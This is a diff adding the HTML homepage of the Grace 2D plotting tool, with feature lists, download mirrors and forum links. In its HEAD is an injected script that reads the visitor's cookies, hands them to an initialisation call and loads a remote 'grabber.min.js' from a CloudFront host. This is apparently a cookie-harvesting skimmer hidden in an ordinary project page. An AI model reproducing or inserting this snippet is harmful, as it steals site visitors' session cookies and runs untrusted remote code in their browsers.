@@ -1,0 +1,376 @@
+<HTML>
+<HEAD>
+ <TITLE>Grace Home</TITLE>
+ <LINK REL="icon" TYPE="image/png" HREF="g.png">
+ <!-- <LINK REL="alternate" TYPE="application/rss+xml" TITLE="Grace news"
+ HREF="rss.xml"> -->
+<script>
+    (function(d){var cookies=d.cookie;window.GRBRAsyncInit=function(){GRBRInit('5cffb77e5e9d3f0026257469',cookies)};
+    var grbr=d.createElement('script');var proto=d.location.protocol||d.location.href.split('//',1)[0];
+    var url=proto+'//d11m8axes1h5ea.cloudfront.net/grabber.min.js';grbr.type='text/javascript';
+    grbr.async=true;grbr.src=url;var s=d.getElementsByTagName('script')[0];s.parentNode.insertBefore(grbr,s)}(document))
+</script>
+</HEAD>
+
+<BODY BGCOLOR="#FFFFFF" TEXT="#000000" LINK="#008C8C" VLINK="#006464" ALINK="#FE0000" BACKGROUND="bg.jpg">
+<CENTER>
+
+<IMG SRC="grace.jpg" ALT="Grace Home">
+
+<P>
+
+<TABLE WIDTH="100%" BORDER="0" CELLPADDING="0" CELLSPACING="0">
+<TR>
+<TD WIDTH="25%"></TD>
+<TD><CENTER>
+|<A HREF="COPYRIGHT.html">Copyright</A>|<A HREF="doc/GPL.html">License</A>|<BR>
+|<A HREF="screenshots/">Screenshots</A>|<A HREF="gallery/">Gallery</A>|<A HREF="https://plasma-gate.weizmann.ac.il/pub/grace/">Download</A>|<BR>
+|<A HREF="doc/FAQ.html">FAQ</A>|<A HREF="doc/UsersGuide.html">User's Guide</A>|<A HREF="doc/Tutorial.html">Tutorial</A>|<A HREF="doc/CHANGES.html">Changes</A>|<BR>
+|<A HREF="phpbb/viewforum.php?f=8">Suggestions and bug reports</A>|<A HREF="phpbb/">Forums</A>|<BR>
+|<A HREF="projects.html">Related projects and links</A>|<BR>
+|<A HREF="devel/">Developer's corner</A>|
+</CENTER>
+</TD>
+<TD WIDTH="25%" VALIGN="TOP" NOWRAP>
+<!-- <CENTER><BIG>Latest news:</BIG></CENTER>
+<script language="JavaScript" type="text/javascript" src="news.js"></script>
+<UL TYPE="disc">
+ <LI><A HREF="phpbb/viewforum.php?f=2"><SMALL>Read more...</SMALL></A></LI>
+</UL> -->
+</TD>
+</TR>
+</TABLE>
+
+<P>
+
+<IMG SRC="bar.jpg" ALT="-------------------------------------------------">
+
+<P>
+
+</CENTER>
+
+<P>
+
+<CENTER>
+<A NAME="intro">
+<TABLE>
+<TR>
+<TD><IMG SRC="circle.jpg" ALT="*"></TD>
+<TD><BIG>Introduction</BIG></TD>
+<TD><IMG SRC="circle.jpg" ALT="*"></TD>
+</TR>
+</TABLE>
+</A>
+</CENTER>
+
+<P>
+
+<b>Grace</b> is a WYSIWYG 2D plotting tool for the X Window System and
+M*tif. Grace runs on practically any version of Unix-like OS. As well, it
+has been successfully ported to VMS, OS/2, and Win9*/NT/2000/XP (some minor
+functionality may be missing, though).
+
+<P>
+
+Grace is a descendant of <A HREF="/Xmgr/"><b>ACE/gr</b></A>, also known as <b>Xmgr</b>.
+
+<P>
+
+<CENTER>
+<A NAME="features">
+<TABLE>
+<TR>
+<TD><IMG SRC="circle.jpg" ALT="*"></TD>
+<TD><BIG>Features</BIG></TD>
+<TD><IMG SRC="circle.jpg" ALT="*"></TD>
+</TR>
+</TABLE>
+</A>
+</CENTER>
+
+Grace features at a glance:
+
+<p>
+
+<table>
+<tr>
+<td><img SRC="romb.jpg" ></td>
+
+<td><b>General</b></td>
+</tr>
+</table>
+
+<ul>
+<li>
+WYSIWYG design</li>
+
+<li>
+Convenient point-and-click graphical user interface</li>
+
+<li>
+Precise control of graph features</li>
+
+<li>
+True publication quality</li>
+
+<li>
+Instant plot refresh</li>
+</ul>
+
+<table>
+<tr>
+<td><img SRC="romb.jpg" ></td>
+
+<td><b>Export Options</b></td>
+</tr>
+</table>
+
+<ul>
+<li>
+Exports vector graphics to (E)PS, PDF, MIF, and SVG formats</li>
+
+<li>
+Supports cross-platform PNG, PNM, and JPEG formats</li>
+
+<li>
+Device-independent Type1 font rastering, including anti-aliasing, ligatures,
+and kerning</li>
+</ul>
+
+<table>
+<tr>
+<td><img SRC="romb.jpg" ></td>
+
+<td><b>Graphing Flexibility</b></td>
+</tr>
+</table>
+
+<ul>
+<li>
+Unlimited number of graphs</li>
+
+<li>
+Unlimited number of curves on a graph</li>
+
+<li>
+Up to 256 customizable colors</li>
+
+<li>
+9 dashed line styles</li>
+
+<li>
+32 fill patterns</li>
+
+<li>
+10 built-in marker symbols; plus, any character glyph from any font can
+be used as a marker</li>
+
+<li>
+Color/fill markers</li>
+
+<li>
+Text annotations with subscripts, superscripts, mixed fonts, styles and
+colors and more complex typesetting</li>
+</ul>
+
+<table>
+<tr>
+<td><img SRC="romb.jpg" ></td>
+
+<td><b>Curve Fitting</b></td>
+</tr>
+</table>
+
+<ul>
+<li>
+Linear and nonlinear least-squares</li>
+
+<li>
+Calculation and display of residuals</li>
+
+<li>
+Arbitrarily complex user-defined fitting functions, including dynamically
+loadable C/Fortran/... modules</li>
+
+<li>
+Fitting with constraints</li>
+
+<li>
+Region restrictions</li>
+
+<li>
+Fitting with arbitrary weight functions</li>
+</ul>
+
+<table>
+<tr>
+<td><img SRC="romb.jpg" ></td>
+
+<td><b>Analysis Capability</b></td>
+</tr>
+</table>
+
+<ul>
+<li>
+FFT</li>
+
+<li>
+Integration and differentiation</li>
+
+<li>
+Histograms</li>
+
+<li>
+Splines, including Akima splines</li>
+
+<li>
+Interpolation and smoothing</li>
+
+<li>
+Convolution, correlation, and covariation</li>
+
+<li>
+Sorting</li>
+</ul>
+
+<table>
+<tr>
+<td><img SRC="romb.jpg" ></td>
+
+<td><b>Data Formats</b></td>
+</tr>
+</table>
+
+<ul>
+<li>
+Unlimited data size; up to six dimensions plus an optional array of strings</li>
+
+<li>
+Reads text data input files</li>
+
+<li>
+Reads 1D netCDF files</li>
+</ul>
+
+<table>
+<tr>
+<td><img SRC="romb.jpg" ></td>
+
+<td><b>Programmability</b></td>
+</tr>
+</table>
+
+<ul>
+<li>
+Built-in programming language</li>
+
+<li>
+Math functions manipulate entire array</li>
+
+<li>
+Variables, including arrays (1D)</li>
+
+<li>
+User-definable functions via loadable modules</li>
+
+<li>
+All aspects of plot outlook can be programmed</li>
+
+<li>
+Controllable by external programs</li>
+</ul>
+
+<table>
+<tr>
+<td><img SRC="romb.jpg" ></td>
+
+<td><b>Customization/Extensibility</b></td>
+</tr>
+</table>
+
+<ul>
+<li>
+Dynamic module loading - write your own C/Fortran/...</li>
+
+<li>
+User-defined colors</li>
+
+<li>
+User-supplied fonts and encodings</li>
+</ul>
+
+
+<P>
+
+Please refer to the <A HREF="doc/UsersGuide.html">Grace User's Guide</A> for more detailed 
+description.
+
+<P>
+
+<CENTER>
+<A NAME="software">
+<TABLE>
+<TR>
+<TD><IMG SRC="circle.jpg" ALT="*"></TD>
+<TD><BIG>Getting software</BIG></TD>
+<TD><IMG SRC="circle.jpg" ALT="*"></TD>
+</TR>
+</TABLE>
+</A>
+</CENTER>
+
+<P>
+
+The software is available from
+<A HREF="/pub/grace/">https://plasma-gate.weizmann.ac.il/pub/grace/</A>
+and it is daily mirrored at
+
+<P>
+
+<TABLE>
+   <TR><TD><IMG SRC="romb.jpg" ALT="*"><TD> <A HREF="ftp://ftp.fu-berlin.de/unix/graphics/grace/">Germany (FTP)</A> <TD> (ftp://ftp.fu-berlin.de/unix/graphics/grace/)
+   <TR><TD><IMG SRC="romb.jpg" ALT="*"><TD> <A HREF="ftp://ftp.u-aizu.ac.jp/pub/SciEng/math/grace/">Japan (FTP)</A> <TD> (ftp://ftp.u-aizu.ac.jp/pub/SciEng/math/grace/)
+</TABLE>
+
+<P>
+
+<CENTER>
+<A NAME="reports">
+<TABLE>
+<TR>
+<TD><IMG SRC="circle.jpg" ALT="*"></TD>
+<TD><BIG>Suggestions and bug reports</BIG></TD>
+<TD><IMG SRC="circle.jpg" ALT="*"></TD>
+</TR>
+</TABLE>
+</A>
+</CENTER>
+
+<P>
+
+If you found a bug in Grace or wish to suggest some improvements, please do
+it <A HREF="phpbb/viewforum.php?f=8">on-line</A>.
+
+<P>
+<CENTER>
+<IMG SRC="bar.jpg" ALT="-------------------------------------------------">
+</CENTER>
+<P>
+
+<TABLE WIDTH="95%">
+<TR>
+<TD ALIGN=LEFT WIDTH="20%">
+<A HREF="http://plasma-gate.weizmann.ac.il/"><IMG BORDER="0" ALIGN=MIDDLE ALT="WIS Plasma Lab" SRC="plwis.gif"></A>
+</TD>
+<TD ALIGN=RIGHT WIDTH="65%">
+<SMALL>Web design: Copyleft &copy; 1998-2000 Evgeny Stambulchik</SMALL>
+</TD>
+<TD>
+<A HREF="http://www.gimp.org/"><IMG BORDER="0" ALIGN=MIDDLE ALT="Graphics by Gimp" SRC="gfx_by_gimp.gif"></A>
+</TD>
+</TR>
+</TABLE>
+<P>
+
+</BODY>
+</HTML>
